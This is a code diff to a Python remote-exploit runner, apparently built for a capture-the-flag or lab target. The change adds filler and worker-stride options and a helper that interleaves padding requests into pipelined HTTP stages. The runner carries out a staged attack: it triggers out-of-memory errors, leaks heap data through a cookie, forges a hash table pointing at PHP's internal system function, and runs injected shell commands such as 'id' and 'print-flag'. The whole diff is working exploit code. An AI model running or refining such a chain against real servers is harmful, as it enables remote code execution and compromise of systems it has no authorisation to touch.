@@ -26,6 +26,8 @@ class RemoteProofConfig:
     retry_delay: float
     leak_length: int
     pre_parameters: int
+    b1_fillers: int
+    worker_stride: int
     use_proxy: bool
     pipelined: bool
     proof_log: Path
@@ -74,18 +76,15 @@ class RemoteProofRunner:
         command = f"echo {nonce};id;echo {nonce}-flag;print-flag&&echo {nonce}-end".encode()
         query = "&".join(f"q{index:04d}=v" for index in range(self.config.pre_parameters))
         a1_path = self.config.endpoint + "?" + query
-        b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length)
+        b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length, self.config.b1_fillers)
         with PersistentHttpClient(self.config.target, self.config.timeout, self.config.use_proxy) as client:
-            leak_requests = (
+            leak_stages = (
                 HttpRequest.post(self.config.endpoint, self.payloads.seed, exploit.BOUNDARY),
                 HttpRequest.get(self.config.readiness_path),
                 HttpRequest.post(a1_path, self.payloads.a1, b"C"),
                 HttpRequest.post(b1_path, self.payloads.b1, exploit.BOUNDARY),
             )
-            if self.config.pipelined:
-                seed, readiness, a1, b1 = client.pipeline(leak_requests)
-            else:
-                seed, readiness, a1, b1 = tuple(client.pipeline((request,))[0] for request in leak_requests)
+            seed, readiness, a1, b1 = self.exchange(client, leak_stages)
             require_oom("seed", seed)
             require_readiness(readiness, self.config.expected_version)
             require_oom("A1", a1)
@@ -98,18 +97,29 @@ class RemoteProofRunner:
             leak = exploit.parse_leaked_cookie(cookie, self.config.profile)
             b2_body = exploit.build_b2(leak.fake_hash_table, leak.zif_system, command)
             ensure_request_size("B2", b2_body)
-            callback_requests = (
+            callback_stages = (
                 HttpRequest.post(self.config.endpoint, self.payloads.a2, exploit.BOUNDARY),
                 HttpRequest.post(self.config.endpoint, b2_body, exploit.BOUNDARY, True),
             )
-            if self.config.pipelined:
-                a2, b2 = client.pipeline(callback_requests)
-            else:
-                a2, b2 = tuple(client.pipeline((request,))[0] for request in callback_requests)
+            a2, b2 = self.exchange(client, callback_stages)
             require_oom("A2", a2)
         output = validate_callback(b2, nonce)
         statuses = seed.status, readiness.status, a1.status, b1.status, a2.status, b2.status
         return RemoteProof(attempt, leak, statuses, output)
+
+    def exchange(self, client: PersistentHttpClient, stages: tuple[HttpRequest, ...]) -> tuple[HttpResponse, ...]:
+        requests: list[HttpRequest] = []
+        indices: list[int] = []
+        for index, stage in enumerate(stages):
+            indices.append(len(requests))
+            requests.append(stage)
+            if index < len(stages) - 1:
+                requests.extend(HttpRequest.get(self.config.readiness_path) for _ in range(self.config.worker_stride - 1))
+        if self.config.pipelined:
+            responses = client.pipeline(tuple(requests))
+        else:
+            responses = tuple(client.pipeline((request,))[0] for request in requests)
+        return tuple(responses[index] for index in indices)
 
     def complete(self, proof: RemoteProof) -> None:
         statuses = "/".join(str(status) for status in proof.statuses)
@@ -167,12 +177,14 @@ def parse_config() -> RemoteProofConfig:
     parser.add_argument("--retry-delay", type=float, default=0.5)
     parser.add_argument("--leak-length", type=integer, default=0x440)
     parser.add_argument("--pre-parameters", type=int, default=8)
+    parser.add_argument("--b1-fillers", type=int, default=5)
+    parser.add_argument("--worker-stride", type=int, default=1)
     parser.add_argument("--direct", action="store_true")
     parser.add_argument("--sequential", action="store_true")
     parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("remote-proof.log"))
     parser.add_argument("--leak-file", type=Path, default=Path(__file__).resolve().with_name("remote-leak.bin"))
     arguments = parser.parse_args()
-    if arguments.attempts < 1 or arguments.pre_parameters < 0 or arguments.timeout <= 0 or arguments.retry_delay < 0:
+    if arguments.attempts < 1 or arguments.pre_parameters < 0 or arguments.b1_fillers < 0 or arguments.worker_stride < 1 or arguments.timeout <= 0 or arguments.retry_delay < 0:
         parser.error("attempts, timeout, retry delay, and pre-parameter count must be valid")
     return RemoteProofConfig(
         HttpTarget.parse(arguments.target),
@@ -185,6 +197,8 @@ def parse_config() -> RemoteProofConfig:
         arguments.retry_delay,
         arguments.leak_length,
         arguments.pre_parameters,
+        arguments.b1_fillers,
+        arguments.worker_stride,
         not arguments.direct,
         not arguments.sequential,
         arguments.proof_log,
